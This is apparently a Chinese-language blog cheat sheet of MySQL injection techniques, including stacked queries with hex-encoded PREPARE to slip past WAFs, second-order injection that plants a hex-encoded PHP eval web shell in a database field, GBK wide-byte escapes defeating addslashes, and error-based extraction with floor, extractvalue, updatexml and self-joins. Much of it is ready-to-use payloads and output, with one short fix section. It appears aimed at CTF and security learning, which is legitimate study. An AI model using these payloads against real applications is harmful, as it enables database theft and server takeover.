---
layout: post
title: mysql注入tips
categories: sql注入
tag: tips
---

## mysql pdo  支持多句执行
比如where后面还能不能update数据，显然我们只需用;闭合第一条SQL语句，在第二条SQL语句里update就行了。
WAF拦截特殊符号及select关键字的问题，我们使用prepare语法：  
`prepare a from 0x73656c656374202a2066726f6d206d7973716c2e757365723b;execute a;` 将需要执行的任意SQL语句用hex编码，prepare后执行即可。

---

## 二次注入
register.php
```
$username = htmlspecialchars(filter($username));
$password = md5($password);
$name = htmlspecialchars(filter($name));
$limit = filter($limit);
$sql = "select uid from users where username = '$username'";
$result = mysql_query($sql);
if($row = mysql_fetch_array($result))
{
  header("location:register.php");exit;
}
$sql = "insert into users(`username`,`password`,`name`,`limit`) values('$username','$password','$name','$limit');";
$result = mysql_query($sql);
if($result)
{
  header("location:login.php");exit;
}
```
```
让message字段入库的时候以16进制写进数据库，只要是没有单引号包裹的16进制最后入库都会还原成原本的字符串。aa’,0x3c3f70687020406576616c28245f504f53545b615d293b3f3e)#

其中16进制是一句话的hex编码。这样的话 我们执行 insert into guestbook(`uid`,`name`, `message`) values('".$uid."','".$name."','".$message."')
```
![](/styles/images/2017/1d0e7787d7cd2ea151106fcebaa9a665.png)
![](/styles/images/2017/cc45911e8825d1f1e85c7fb1737cd63d.png)

```
#之后的被注释，0x3c3f70687020406576616c28245f504f53545b615d293b3f3e就是字段message的值，而且是没有单引号包裹的。所以当我们执行了insert操作之后。message字段的值就是<?php eval($_POST[a]);?>了
```
```
function filter($input)
{
  return $input;
}
foreach(array('_GET','_POST','_COOKIE') as $key){
    foreach($$key as $k =&gt; $v){
        if(is_array($v)){
            errorBox("hello,sangebaimao!");
        }else{
            $k[0] !='_'?$$k = addslashes($v):$$k = "";
        }
    }
}
所以所有参数的单引号，双引号，反斜杠被转义为:\' \" \\，但是带入sql语句执行后的结果就是各参数的值都被原样保留了下来。
name和username中的&,",',<,>被转换成HTML实体代码&成为&amp;"成为&quot;'成为';<成为 &lt;>成为&gt;</li>
```
二次注入点  limit 后
```
$name = $_SESSION['users'];
$uid = $_SESSION['uid'];
$num = $_SESSION['limit'];
$message = htmlspecialchars(filter($message));
$sql = "insert into guestbook(`uid`,`name`, `message`) values('".$uid."','".$name."','".$message."');";
$result = mysql_query($sql);
if($result)
  {
    header("location:main.php");
  }
$sql = "select id,name,message from guestbook where uid=".$uid." order by id desc limit 0,".$num.";";  
$result = mysql_query($sql);
```

---
## 宽字节

宽字节注入原理
有三种形式：
（1）情景一：在PHP中使用mysql_query(“set names GBK”);指定三个字符集（客户端、连接层、结果集）都是GBK编码。
情景代码： 
```
mysql_query(“set names GBK”);
$bar = addslashes($_GET[‘bar’]) ;
$sql = “select password from user where bar=’{$bar}’”;
$res = mysql_query($sql) ;
```

提交：`http://127.0.0.1/foo.php?bar=admin%df%27`
这时，发生如下转换：
`%df%27=====(addslashes)======>%df%5c%27======(GBK)======>運’`
带入sql为：
`Select password from user where bar=‘運’`
成功将单引号闭合。为了避免漏洞，网站一般会设置UTF-8编码，然后进行转义过滤。但是由于一些不经意的字符集转换，又会导致漏洞。
 
（2）情景二：
使用set names UTF-8指定了UTF-8字符集，并且也使用转义函数进行转义。有时候，为了避免乱码，会将一些用户提交的GBK字符使用iconv函数（或者mb_convert_encoding）先转为UTF-8，然后再拼接入SQL语句。
情景代码：
```
mysql_query(“set names UTF-8”) ;
$bar =iconv(“GBK”,”UTF-8”, addslashes($_GET[‘’bar])) ;
$sql = “select password from user where bar=’{$bar}’” ;
$res = mysql_query($sql) ;
```
我们可以看到，为了使得SQL语句中的字符集保持一致，一般都会使用iconv等字符集转换函数进行字符集转换，问题就是出在了GBK向UTF-8转换的过程中。
提交：`http://127.0.0.1/foo.php?bar=%e5%5c%27`
变换过程：（e55c转为UTF-8为e98ca6）
`e55c27====(addslashes)====>e55c5c5c27====(iconv)====>e98ca65c5c27`
可以看到，多出了一个5c，将转义符（反斜杠）本身转义，使得后面的%27发挥了作用。
测试如下：



（3）情景三：使用iconv进行字符集转换，将UTF-8转为GBK，同时，set names字符集为GBK。提交%e9%8c%a6即可。
这个情景的大前提是先编码后转义：
`e98ca6====(iconv)=====>e55c=====(addslashes)====>e55c5c`
同样可以多出一个反斜杠进行利用，在此不再详述，因为漏洞条件比较苛刻。
 
 
6、安全方案
对于宽字节编码，有一种最好的修补就是：
（1）使用mysql_set_charset(GBK)指定字符集
（2）使用mysql_real_escape_string进行转义
原理是，mysql_real_escape_string与addslashes的不同之处在于其会考虑当前设置的字符集，不会出现前面e5和5c拼接为一个宽字节的问题，但是这个“当前字符集”如何确定呢？
就是使用mysql_set_charset进行指定。
上述的两个条件是“与”运算的关系，少一条都不行。



### 报错
**利用floor**

    mysql> select * from article where id = 1 and (select 1 from  (select count(*),concat(version(),floor(rand(0)*2))x from  information_schema.tables group by x)a);
    ERROR 1062 (23000): Duplicate entry ’5.1.33-community-log1′ for key ’group_key’


我的注释：通过floor报错的方法来爆数据的本质是group  by语句的报错。group by语句报错的原因是floor(random(0)*2)的不确定性，即可能为0也可能为1（group by  key的原理是循环读取数据的每一行，将结果保存于临时表中。读取每一行的key时，如果key存在于临时表中，则不在临时表中则更新临时表中的数据；如 果该key不存在于临时表中，则在临时表中插入key所在行的数据。group by  floor(random(0)*2)出错的原因是key是个随机数，检测临时表中key是否存在时计算了一下floor(random(0)*2)可能 为0，如果此时临时表只有key为1的行不存在key为0的行，那么数据库要将该条记录插入临时表，由于是随机数，插时又要计算一下随机值，此时 floor(random(0)*2)结果可能为1，就会导致插入时冲突而报错。即检测时和插入时两次计算了随机数的值。

**利用ExtractValue**

    select * from article where id = 1 and extractvalue(1, concat(0x5c,(select pass from admin limit 1)));–

ERROR 1105 (HY000): XPATH syntax error: ’\admin888′
我的注释：extractvalue()函数有两个参数，在实际注入时第一个参数设为1，
第二个参数就是需要爆的数据，如 extractvalue(1,
concat(0x5c,version()))。同样，在使用中会遇到如下面UpdateXml()类似的相同问题，即果在爆的数据前不连接其他字符可
能会显示不完全。即获取版本号时，第二个参数不能为version(),而应改为concat(0x5c,version())

    http://sql.sycsec.com/f8077f08525d33bd7f0b1fd98b53dc59/index.php?uid=1%bf'and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables where table_schema=0x77696b69 limit 1)))%23
    http://sql.sycsec.com/f8077f08525d33bd7f0b1fd98b53dc59/index.php?uid=1%bf'and extractvalue(1, concat(0x5c, (select key_flag from `[key_flag]` limit 1)))%23

**利用UpdateXml**
测试语句

    and 1=(updatexml(1,concat(0x3a,(select user())),1))

实际测试过程

    mysql> select * from article where id = 1 and 1=(updatexml(0x3a,concat(1,(select
     user())),1))ERROR 1105 (HY000): XPATH syntax error: ’:root@localhost’

我的注释：UpdateXml()函数有三个参数，在实际渗透时第一个和第三个参数直接写1即可，第二个参数就是需要爆出的内容，要爆出不同的内容直接修改第二个参数即可。但是在实际使用时注意一个问题：即爆错的内容可能显示不完整。





**5、join报错注入**
利用表自己join自己。来达到列名相同来爆列名。参考文章：http://www.2cto.com/Article/201105/90933.html（绕过ids过滤information_schema接续灌注）。
下面以爆mysql.user表为例爆字段名的过程：

    （1）爆第一个列名
    select * from(select * from mysql.user a join mysql.user b)c;

    （2）爆第二个列名（使用using）
    select * from(select * from mysql.user a join mysql.user b using(Host))c;

    （3）爆第三列名（还是使用using，参数是前两个列的列名）
    select * from(select * from mysql.user a join mysql.user b using(Host,User))c;

    依次类推，只要修改语句的using即可。
    下面是使用join绕过ids的过程（ids过滤了information_schema）利用过程：
    先本地构造测试表
    create table users(id int,name varchar(20),passwd varchar(32));
    insert into users value(1,’mickey’,’827ccb0eea8a706c4c34a16891f84e7b’);
    create table news(is_admin int(1),id int(2),title varchar(100),date date);
    insert into news values(1,1,’hello mickey’,now());

    (1)爆列名
    mysql> select *  from(select * from users a join users b)c;

    mysql> select *  from(select * from users a join users b using(id))c;
    mysql> select *  from(select * from users a join users b using(id,name))c;

    (2)爆数据
    select *  from(select * from users a join users b using(id,name,password))c
